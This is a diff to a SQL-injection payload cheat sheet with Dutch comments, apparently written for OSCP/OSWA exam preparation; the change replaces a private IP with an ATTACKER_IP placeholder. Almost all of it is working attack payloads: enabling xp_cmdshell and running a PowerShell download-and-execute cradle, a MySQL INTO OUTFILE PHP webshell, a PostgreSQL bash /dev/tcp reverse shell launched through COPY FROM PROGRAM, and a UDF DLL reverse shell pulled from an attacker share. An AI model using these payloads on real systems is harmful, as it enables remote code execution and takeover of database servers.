@@ -3,20 +3,20 @@
 '; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
 '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
 '; EXEC xp_cmdshell 'whoami';-- -
-'; EXEC xp_cmdshell 'powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://10.0.0.1/payloads/amsi-shell.ps1'')';-- -
+'; EXEC xp_cmdshell 'powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payloads/amsi-shell.ps1'')';-- -
 # === MySQL: INTO OUTFILE webshell ===
 ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
 # Gebruik: http://target/shell.php?cmd=id
 # === PostgreSQL: COPY TO + reverse shell ===
-'; COPY (SELECT 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1') TO '/tmp/shell.sh';-- -
+'; COPY (SELECT 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1') TO '/tmp/shell.sh';-- -
 '; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash /tmp/shell.sh';-- -
 # === PostgreSQL: UDF (User Defined Function) ===
 # Stap 1: Compileer C extensie met reverse shell
 # Stap 2: Upload via Large Objects
-SELECT lo_import('\\\\10.0.0.1\\share\\rev_shell.dll', 1337);
+SELECT lo_import('\\\\ATTACKER_IP\\share\\rev_shell.dll', 1337);
 SELECT lo_export(1337, 'C:\\path\\rev_shell.dll');
 # Stap 3: Maak functie en roep aan
 CREATE OR REPLACE FUNCTION rev_shell(text,integer) RETURNS void AS 'C:\\path\\rev_shell.dll','connect_back' LANGUAGE C STRICT;
-SELECT rev_shell('10.0.0.1', 443);
+SELECT rev_shell('ATTACKER_IP', 443);
 # Tip: PostgreSQL COPY FROM PROGRAM = directe RCE (superuser nodig)
 # Tip: MSSQL xp_cmdshell = meest voorkomend in OSCP/OSWA examen
